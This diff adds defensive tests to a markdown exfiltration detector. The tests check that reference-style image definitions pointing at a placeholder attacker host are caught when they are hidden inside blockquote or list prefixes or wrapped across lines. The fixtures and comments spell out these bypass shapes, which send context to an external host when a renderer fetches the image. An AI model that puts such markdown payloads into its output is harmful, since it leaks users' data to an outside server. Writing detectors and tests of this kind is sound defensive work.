@@ -2086,3 +2086,406 @@ test("T84#F-003: escape-aware description ends do not change the cost's shape", 
   }
   expect(slow).toEqual([]);
 });
+
+// ---------------------------------------------------------------------------
+// T89 — closes the block-container bypass RESIDUALS.md recorded as an
+// accepted limitation (2026-09-07): a reference definition prefixed by a
+// blockquote (`> [ref]: URL`), a bullet-list item (`- [ref]: URL`) or an
+// ordered-list item (`1. [ref]: URL`) was invisible to
+// `readReferenceDefinitions`, so an image resolving through it produced ZERO
+// findings while `marked` still fetched the attacker host — all four public
+// boundaries passed the payload with `redaction.state:"none"`, and the
+// allowlist could not help because there was no finding to allow. Phase 1
+// judged this required real block-structure parsing; re-measured, it does
+// not — see `skipBlockContainerPrefix` in exfil.ts. Written before the fix;
+// every case in the first test below failed on the pre-T89 code.
+// ---------------------------------------------------------------------------
+
+const T89_CONTAINER_PREFIXES: Record<string, string> = {
+  blockquote: "> ",
+  bulletList: "- ",
+  orderedList: "1. ",
+};
+
+test("T89: a reference definition inside a block container is a finding, in all twelve spellings", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // Four CommonMark image forms — full reference, collapsed, shortcut, and an
+  // image nested inside a link (the README badge idiom) — each crossed with
+  // three container prefixes.
+  const fetched: Record<string, string> = {};
+  for (const [container, prefix] of Object.entries(T89_CONTAINER_PREFIXES)) {
+    fetched[`${container}_fullReference`] =
+      `![build][badge]\n\n${prefix}[badge]: ${U}\n`;
+    fetched[`${container}_collapsed`] = `![status][]\n\n${prefix}[status]: ${U}\n`;
+    fetched[`${container}_shortcut`] = `![logo]\n\n${prefix}[logo]: ${U}\n`;
+    fetched[`${container}_imageInLink`] =
+      `[![badge][img]](https://ci.example.com/job)\n\n${prefix}[img]: ${U}\n`;
+  }
+  expect(Object.keys(fetched).length).toBe(12);
+
+  for (const [id, content] of Object.entries(fetched)) {
+    const matches = detectExfil(content, []);
+    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
+    expect(
+      `${id}:${matches.every((m) => m.policyId === "egress.reference-link-exfil")}`,
+    ).toBe(`${id}:true`);
+    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
+      `${id}:false`,
+    );
+
+    // The detector is not where the floor is proved: driven through the same
+    // functions the MCP transport and the durable sinks call.
+    const serialized = JSON.stringify({ note: content });
+    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
+    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
+    if (persisted.allowed) {
+      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
+    }
+    const transported = validateOutputForTransport({
+      format: "json",
+      value: { note: content },
+    });
+    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
+    if (transported.ok) {
+      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
+      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
+    }
+  }
+});
+
+test("T89: the four no-container controls, an allowlisted host, malformed colon spacing and ordinary container prose are unaffected", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+
+  // The four no-container controls: the same four image forms with no
+  // container prefix at all must still resolve to exactly one finding each —
+  // this repair must not move them.
+  const controls: Record<string, string> = {
+    fullReference: `![build][badge]\n\n[badge]: ${U}\n`,
+    collapsed: `![status][]\n\n[status]: ${U}\n`,
+    shortcut: `![logo]\n\n[logo]: ${U}\n`,
+    imageInLink: `[![badge][img]](https://ci.example.com/job)\n\n[img]: ${U}\n`,
+  };
+  for (const [id, content] of Object.entries(controls)) {
+    expect(`${id}:${detectExfil(content, []).length}`).toBe(`${id}:1`);
+  }
+
+  // An allowlisted host inside a container still releases — the allowlist
+  // still governs a finding once the definition is one, container or not.
+  expect(
+    detectExfil(`![logo]\n\n> [logo]: https://cdn.example.org/1.png\n`, [
+      "cdn.example.org",
+    ]).length,
+  ).toBe(0);
+
+  // A space before the colon is not CommonMark definition syntax in any
+  // container: the colon-adjacency test the caller runs after the skip is
+  // unchanged, so this must stay released, container-prefixed or not.
+  for (const [container, prefix] of Object.entries(T89_CONTAINER_PREFIXES)) {
+    const content = `![logo]\n\n${prefix}[logo] : ${U}\n`;
+    expect(`${container}:${detectExfil(content, []).length}`).toBe(`${container}:0`);
+  }
+
+  // Ordinary container prose that merely starts with a marker-shaped
+  // character is not a container prefix and must not become one: a bullet
+  // character with no following space/tab, and a decimal number with no
+  // following space/tab after its `.`, both fail the marker grammar and the
+  // line is read exactly as an unrecognised line always was.
+  expect(detectExfil(`![logo]\n\n-5 items sold, not [logo]: ${U}\n`, []).length).toBe(
+    0,
+  );
+  expect(detectExfil(`![logo]\n\n3.14 is pi, not [logo]: ${U}\n`, []).length).toBe(0);
+
+  // Ordinary list/quote prose that merely contains an inline link is still
+  // not a definition — the container skip only widens where the scan looks
+  // for `[`, never what counts as one once it is found.
+  for (const prefix of Object.values(T89_CONTAINER_PREFIXES)) {
+    expect(
+      detectExfil(`${prefix}See [text](${U}) for details\n`, []).length,
+    ).toBe(0);
+  }
+});
+
+// Over-approximation direction (policies.md: "a construct quoted inside a
+// code fence still becomes a finding"). This repair only widens where the
+// scanner looks for `[` at a line start; it must not narrow the existing
+// context-blindness the rest of the floor relies on — a container-prefixed
+// definition inside a fenced code block is still flagged, exactly as an
+// unprefixed one already was.
+test("T89: a container-prefixed definition inside a fenced code block still flags (over-approximation direction preserved)", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  const content = "```\n> [logo]: " + U + "\n```\n\n![logo]\n";
+  const matches = detectExfil(content, []);
+  expect(matches.length).toBeGreaterThan(0);
+  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
+});
+
+// COST (AC/T89). `skipBlockContainerPrefix` must stay linear: every branch
+// either breaks immediately or advances at least one character, so one
+// line's skip costs at most that line's own length, summed at most
+// `content.length` over the whole scan. Measured on a megabyte-scale
+// adversarial input built from a long run of alternating nested markers, both
+// spread across many lines and concentrated on one pathological line.
+test("T89: the block-container skip is linear — megabyte-scale nested markers complete well under a second", () => {
+  const BUDGET_MS = 900;
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  const nestedPrefix = "> - 1. ".repeat(40); // deeply nested, alternating, 280 bytes
+  const lineCount = 4000; // ~1.1 MB of nested-marker lines
+  const shapes: Record<string, string> = {
+    manyNestedContainerLines: Array.from(
+      { length: lineCount },
+      (_, i) => `${nestedPrefix}[k${i}]: https://ok.example.org/x\n`,
+    ).join(""),
+    // the worst single LINE case: one line, ~1 MB of alternating markers,
+    // never resolving to `[` at all.
+    oneLineMillionMarkers: "> - 1. ".repeat(150000) + "not a bracket at all\n",
+    // the real bypass shape at scale: many nested, allowlisted definitions,
+    // then one nested definition carrying the attacker host.
+    nestedDefsThenAttacker:
+      Array.from(
+        { length: 3000 },
+        (_, i) => `${nestedPrefix}[k${i}]: https://ok.example.org/x\n`,
+      ).join("") +
+      `${nestedPrefix}[target]: ${U}\n` +
+      "![x][target]\n",
+  };
+  const slow: string[] = [];
+  const timings: string[] = [];
+  for (const [id, text] of Object.entries(shapes)) {
+    const started = performance.now();
+    const matches = detectExfil(text, []);
+    const elapsed = performance.now() - started;
+    timings.push(`${id}: ${text.length} bytes in ${elapsed.toFixed(1)}ms`);
+    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
+    if (id === "nestedDefsThenAttacker") {
+      expect(matches.some((m) => m.value === U)).toBe(true);
+    }
+  }
+  console.log("T89 cost measurement:\n" + timings.join("\n"));
+  expect(slow).toEqual([]);
+});
+
+// ---------------------------------------------------------------------------
+// T90 — closes the narrower residual T89 recorded when it closed the twelve
+// single-line block-container cases: a definition whose DESTINATION itself
+// wraps to a second physical line, where the continuation line REPEATS a
+// block-container marker (`> [ref]:` \ `> URL`), was read wrong —
+// `readDefinitionDestination` took the marker byte itself as the destination.
+// Reproduced against `marked` (see the scratch oracle referenced in
+// RESIDUALS.md/policies.md, not taken on report): the renderer resolves the
+// multi-line destination through the repeated marker and fetches the
+// attacker host; pre-fix, the detector produced ZERO findings for every case
+// in the first test below.
+//
+// `marked` is the renderer oracle throughout this section: for each row
+// checked here the renderer's own `<img src>` (or lack of one) decided
+// whether the shape is a genuine bypass, not this file's own reading of the
+// grammar. Two results from that oracle shaped which rows are asserted as
+// findings versus merely "still flagged, not released" below:
+//   - a REPEATED bullet or ordered-list marker on the continuation line does
+//     NOT continue the same destination for `marked` — CommonMark reads a
+//     repeated list marker as a NEW list item, so `- [ref]:` / `- URL` become
+//     two separate `<li>`s and the reference never resolves. Only a REPEATED
+//     BLOCKQUOTE marker (`>`) continues the same block content;
+//   - an OMITTED marker on the continuation line (true CommonMark lazy
+//     continuation) resolves for a bullet list (list continuation is
+//     indentation-based, not marker-based) but does NOT resolve for a
+//     blockquote (a link reference definition does not get a blockquote's
+//     lazy-paragraph-continuation allowance the way a paragraph does).
+// Both facts were measured, not assumed, with the scratch probe described
+// above. The detector does not need to reproduce this distinction to stay
+// sound: `skipBlockContainerPrefix` is reused unchanged from T89, so a
+// continuation this floor cannot prove is safe is flagged anyway — the
+// over-approximation direction this file has used throughout. It only needs
+// to reproduce the distinction to know which rows in the tests below assert
+// "the renderer fetches, so this must be a finding" versus "the renderer
+// does not fetch, so a finding here is an accepted over-approximation, not a
+// contract".
+// ---------------------------------------------------------------------------
+
+test("T90: a definition whose destination wraps behind a repeated container marker is a finding", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // Every row here was measured against `marked` to produce an `<img src>`
+  // naming the attacker host — a genuine renderer fetch, not an
+  // over-approximation. Each failed to produce any finding before this fix.
+  const fetched: Record<string, string> = {
+    // The reported bypass itself, in all four CommonMark image spellings —
+    // the same discipline T89 used for its twelve single-line spellings.
+    fullReference: `![alt][ref]\n\n> [ref]:\n> ${U}\n`,
+    collapsed: `![alt][]\n\n> [alt]:\n> ${U}\n`,
+    shortcut: `![alt]\n\n> [alt]:\n> ${U}\n`,
+    imageInLink: `[![alt][ref]](https://ci.example.com/job)\n\n> [ref]:\n> ${U}\n`,
+    // Nested containers on the opening line, fewer markers repeated on the
+    // continuation — still resolves for `marked` because list continuation
+    // inside the blockquote only needs the blockquote's own marker repeated.
+    nestedFewerOnContinuation: `![alt][ref]\n\n> - 1. [ref]:\n> ${U}\n`,
+    // Trailing space between the colon and the wrap: the existing
+    // non-newline whitespace skip and the new newline-crossing skip compose.
+    trailingSpaceBeforeWrap: `![alt][ref]\n\n> [ref]: \n> ${U}\n`,
+    // A title on a FURTHER wrapped, container-prefixed line must not defeat
+    // finding the destination itself, one line closer.
+    titleOnFurtherWrappedLine: `![alt][ref]\n\n> [ref]:\n> ${U}\n> "t"\n`,
+  };
+
+  for (const [id, content] of Object.entries(fetched)) {
+    const matches = detectExfil(content, []);
+    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
+    expect(`${id}:${matches.some((m) => m.value === U)}`).toBe(`${id}:true`);
+    expect(`${id}:${matches.every((m) => m.policyId === "egress.reference-link-exfil")}`).toBe(
+      `${id}:true`,
+    );
+    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
+      `${id}:false`,
+    );
+
+    // Same four public boundaries T89 drove this through — the detector is
+    // not where this floor is proved.
+    const serialized = JSON.stringify({ note: content });
+    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
+    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
+    if (persisted.allowed) {
+      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
+    }
+    const transported = validateOutputForTransport({
+      format: "json",
+      value: { note: content },
+    });
+    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
+    if (transported.ok) {
+      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
+      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
+    }
+  }
+});
+
+test("T90: controls are unaffected — same-line definitions, an unprefixed wrap, and a bullet's lazy (marker-omitted) continuation", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // These were already findings before T90 and must stay exactly that: this
+  // repair only changes what happens when the destination reader crosses a
+  // newline, and none of these cross one behind a marker it could misread.
+  const controls: Record<string, string> = {
+    noContainer_sameLine: `![alt][ref]\n\n[ref]: ${U}\n`,
+    noContainer_wraps: `![alt][ref]\n\n[ref]:\n${U}\n`,
+    blockquote_sameLine_T89: `![alt][ref]\n\n> [ref]: ${U}\n`,
+    bullet_sameLine_T89: `![alt][ref]\n\n- [ref]: ${U}\n`,
+    ordered_sameLine_T89: `![alt][ref]\n\n1. [ref]: ${U}\n`,
+    // A bullet's own lazy continuation (marker OMITTED on the destination
+    // line) already resolved before T90 — CommonMark list continuation is
+    // indentation-based, so the old plain `\s*` crossed the newline with
+    // nothing to misread. Measured against `marked`: this genuinely fetches.
+    bulletLazyContinuation: `![alt][ref]\n\n- [ref]:\n${U}\n`,
+  };
+  for (const [id, content] of Object.entries(controls)) {
+    const matches = detectExfil(content, []);
+    expect(`${id}:${matches.length}`).toBe(`${id}:1`);
+    expect(`${id}:${matches[0]?.value}`).toBe(`${id}:${U}`);
+  }
+
+  // A blockquote's lazy continuation (marker OMITTED) does NOT resolve for
+  // `marked` — a link reference definition does not inherit a paragraph's
+  // lazy-continuation allowance. The detector already over-approximated this
+  // one before T90 (the plain `\s*` crossed the newline unobstructed) and
+  // continues to; asserted here so a future change to the newline-crossing
+  // skip cannot silently start releasing it instead.
+  expect(detectExfil(`![alt][ref]\n\n> [ref]:\n${U}\n`, []).length).toBeGreaterThan(0);
+
+  // The allowlist still governs a wrapped, container-prefixed destination
+  // exactly as it governs any other finding.
+  expect(
+    detectExfil(`![logo]\n\n> [logo]:\n> https://cdn.example.org/1.png\n`, [
+      "cdn.example.org",
+    ]).length,
+  ).toBe(0);
+});
+
+test("T90: shapes the renderer does not resolve are still flagged, not released — over-approximation, not a contract", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // Measured against `marked`: none of these four produce an `<img src>` for
+  // the attacker host — a repeated LIST marker starts a new list item rather
+  // than continuing the destination, and mismatched markers across the two
+  // lines fare no better. `skipBlockContainerPrefix` does not model that
+  // distinction (T89 already applies it order- and count-unconstrained on
+  // the label side, for the same reason), so these are flagged anyway. That
+  // is this floor's stated direction — over-flag, never release — and this
+  // test pins it as a fact about this repair rather than a silent side
+  // effect: a future change is free to still flag these, but must not start
+  // asserting the renderer fetches them.
+  const notActuallyFetched: Record<string, string> = {
+    bulletRepeatedMarker_newListItem: `![alt][ref]\n\n- [ref]:\n- ${U}\n`,
+    orderedRepeatedMarker_newListItem: `![alt][ref]\n\n1. [ref]:\n1. ${U}\n`,
+    mismatchedMarkers_bulletThenBlockquote: `![alt][ref]\n\n- [ref]:\n> ${U}\n`,
+    mismatchedMarkers_blockquoteThenBullet: `![alt][ref]\n\n> [ref]:\n- ${U}\n`,
+  };
+  for (const [id, content] of Object.entries(notActuallyFetched)) {
+    expect(`${id}:${detectExfil(content, []).length > 0}`).toBe(`${id}:true`);
+  }
+});
+
+test("T90: a tab after the blockquote marker on the continuation line still lands on the real URL, not the marker byte", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // `skipBlockContainerPrefix` consumes at most one SPACE after a blockquote
+  // `>` as the marker's own trailing whitespace, never a tab — but a tab
+  // there is still ordinary leading whitespace, consumed by that same
+  // function's own per-round whitespace skip on its next pass. Either path
+  // must land on the real URL; the destination must never be read as `>` or
+  // as a truncated one-byte span.
+  const content = `![alt][ref]\n\n> [ref]:\n>\t${U}\n`;
+  const matches = detectExfil(content, []);
+  expect(matches.some((m) => m.value === U)).toBe(true);
+});
+
+test("T90: a wrapped, container-prefixed destination inside a fenced code block still flags (over-approximation direction preserved)", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  const content = "```\n> [logo]:\n> " + U + "\n```\n\n![logo]\n";
+  const matches = detectExfil(content, []);
+  expect(matches.length).toBeGreaterThan(0);
+  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
+});
+
+// COST (T90). `skipDestinationLeadingWhitespace` composes two already-linear
+// costs — see the comment above it in exfil.ts — so it must stay linear too.
+// Measured on megabyte-scale adversarial input built from many reference
+// definitions whose destination wraps behind a long, nested marker run, plus
+// the shared-offset shape T84#F-001 measured (many line-start `[` resolving
+// to one shared `]:`), now with that shared destination itself wrapped
+// behind a nested marker run.
+test("T90: the destination-side block-container skip is linear — megabyte-scale wrapped, nested-marker destinations complete well under a second", () => {
+  const BUDGET_MS = 900;
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  const nestedPrefix = "> - 1. ".repeat(40); // 280 bytes, deeply nested, alternating
+  const lineCount = 3500; // ~1.1 MB across many wrapped, nested-marker definitions
+  const shapes: Record<string, string> = {
+    manyWrappedNestedDefs: Array.from(
+      { length: lineCount },
+      (_, i) => `[k${i}]:\n${nestedPrefix}https://ok.example.org/x\n`,
+    ).join(""),
+    // The real bypass shape at scale: many wrapped, nested, allowlisted
+    // definitions, then one wrapped nested definition carrying the attacker
+    // host, and its use.
+    wrappedNestedDefsThenAttacker:
+      Array.from(
+        { length: 3000 },
+        (_, i) => `[k${i}]:\n${nestedPrefix}https://ok.example.org/x\n`,
+      ).join("") + `[target]:\n${nestedPrefix}${U}\n` + "![x][target]\n",
+    // T84#F-001's shared-offset shape: every one of 20 000 line-start `[`
+    // resolves to the SAME `]:`, and that shared destination now wraps
+    // behind a nested marker run before failing to parse (a huge whitespace
+    // tail with no destination at all) — stresses the memo cache and the
+    // new skip together.
+    sharedOffsetWrappedThenFails:
+      "[a\n".repeat(20000) + "]:\n" + nestedPrefix + " ".repeat(100000),
+  };
+  const slow: string[] = [];
+  const timings: string[] = [];
+  for (const [id, text] of Object.entries(shapes)) {
+    const started = performance.now();
+    const matches = detectExfil(text, []);
+    const elapsed = performance.now() - started;
+    timings.push(`${id}: ${text.length} bytes in ${elapsed.toFixed(1)}ms`);
+    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
+    if (id === "wrappedNestedDefsThenAttacker") {
+      expect(matches.some((m) => m.value === U)).toBe(true);
+    }
+  }
+  console.log("T90 cost measurement:\n" + timings.join("\n"));
+  expect(slow).toEqual([]);
+});
